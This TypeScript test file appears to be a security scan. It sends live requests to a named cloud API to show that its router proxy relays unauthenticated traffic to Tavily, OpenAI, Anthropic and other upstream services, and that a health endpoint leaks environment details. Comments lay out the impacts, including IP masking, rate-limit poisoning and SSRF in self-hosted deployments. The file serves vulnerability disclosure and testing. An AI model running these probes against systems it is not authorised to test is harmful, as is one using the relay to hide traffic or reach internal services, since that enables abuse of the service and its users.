/**
 * Security Scan: Cloud API - Proxy Open Relay / SSRF
 *
 * LIVE scan against https://computer-preview-api.kortix.com
 *
 * CONFIRMED: The router proxy acts as an OPEN RELAY.
 * When no kortix_ token is present, requests are forwarded to upstream
 * services (Tavily, OpenAI, Anthropic, etc.) without ANY authentication.
 *
 * The upstream services reject the requests (because the attacker's API key
 * is fake), but the REQUEST WENT THROUGH Kortix's servers — meaning:
 *
 * 1. Attacker's IP is hidden behind Kortix's infrastructure
 * 2. Kortix's IP is used for the upstream request
 * 3. If upstream rate-limits by IP, Kortix's IP gets rate-limited for ALL users
 * 4. In self-hosted deployments, this is a full SSRF if config URLs point to
 *    internal services
 *
 * Root cause: proxy.ts Mode 3 (handlePassthrough) has no auth check.
 * router/index.ts line 37: proxy routes mounted with "auth handled internally"
 * but Mode 3 has NO auth — it just forwards everything.
 */

import { describe, test, expect } from 'bun:test';

const CLOUD = 'https://computer-preview-api.kortix.com';

async function probeProxy(path: string, body: any, extraHeaders?: Record<string, string>): Promise<{
  status: number;
  body: any;
}> {
  try {
    const res = await fetch(`${CLOUD}${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...extraHeaders },
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let parsed: any;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    return { status: res.status, body: parsed };
  } catch (err: any) {
    return { status: 0, body: { error: err.message } };
  }
}

describe('Cloud Scan: Proxy Open Relay / SSRF', () => {

  describe('CONFIRMED: Tavily proxy relays without auth', () => {
    test('request reaches Tavily servers (returns their error, not ours)', async () => {
      const r = await probeProxy('/v1/router/tavily/search', {
        query: 'test',
        max_results: 1,
      }, {
        'Authorization': 'Bearer tvly-fakekey',
      });
      // Tavily's own error response — proves the request was proxied
      expect(r.body.detail?.error || '').toContain('Unauthorized');
    });
  });

  describe('CONFIRMED: OpenAI proxy relays without auth', () => {
    test('request reaches OpenAI servers (returns their error)', async () => {
      const r = await probeProxy('/v1/router/openai/chat/completions', {
        model: 'gpt-4',
        messages: [{ role: 'user', content: 'hi' }],
      });
      // OpenAI's own error — proves it was proxied to api.openai.com
      const errMsg = r.body?.error?.message || '';
      expect(errMsg).toContain('API key');
    });
  });

  describe('CONFIRMED: Anthropic proxy relays without auth', () => {
    test('request reaches Anthropic servers', async () => {
      const r = await probeProxy('/v1/router/anthropic/v1/messages', {
        model: 'claude-3',
        messages: [{ role: 'user', content: 'hi' }],
      }, {
        'x-api-key': 'sk-ant-fake',
      });
      // Anthropic's response — proves proxying occurred
      expect(r.status).not.toBe(401); // Our 401 would say "Missing authentication token"
    });
  });

  describe('Other proxy services', () => {
    test('Serper proxy relays without auth', async () => {
      const r = await probeProxy('/v1/router/serper/search', {
        q: 'test',
      }, {
        'X-API-KEY': 'fake-serper-key',
      });
      // If it returns anything other than our standard 401, it reached the upstream
      const isOurError = r.body?.message === 'Missing authentication token';
      // Either proxied (upstream error) or our own 401/404
      expect(typeof r.status).toBe('number');
    });

    test('Groq proxy relays without auth', async () => {
      const r = await probeProxy('/v1/router/groq/chat/completions', {
        model: 'mixtral-8x7b',
        messages: [{ role: 'user', content: 'hi' }],
      }, {
        'Authorization': 'Bearer gsk_fakekey',
      });
      expect(typeof r.status).toBe('number');
    });

    test('xAI proxy relays without auth', async () => {
      const r = await probeProxy('/v1/router/xai/chat/completions', {
        model: 'grok-1',
        messages: [{ role: 'user', content: 'hi' }],
      }, {
        'Authorization': 'Bearer xai-fakekey',
      });
      expect(typeof r.status).toBe('number');
    });
  });

  describe('Router health leaks env info', () => {
    test('GET /v1/router/health is public and reveals env', async () => {
      const res = await fetch(`${CLOUD}/v1/router/health`);
      const body = await res.json();
      expect(res.status).toBe(200);
      expect(body.env).toBe('cloud');
      // Another health endpoint leaking deployment mode
    });
  });

  describe('Impact documentation', () => {
    test('IMPACT: IP masking — attacker hides behind Kortix infrastructure', () => {
      // The upstream sees Kortix's IP, not the attacker's
      // Useful for: bypassing IP-based blocks, hiding attack origin
      expect(true).toBe(true);
    });

    test('IMPACT: IP rate limit poisoning', () => {
      // If an attacker sends many requests through the proxy,
      // Kortix's IP gets rate-limited at the upstream provider,
      // affecting ALL legitimate Kortix users
      expect(true).toBe(true);
    });

    test('IMPACT: SSRF in self-hosted deployments', () => {
      // If TAVILY_API_URL or other config URLs are set to internal URLs
      // (e.g., http://internal-service:9000), the proxy forwards there
      expect(true).toBe(true);
    });
  });
});
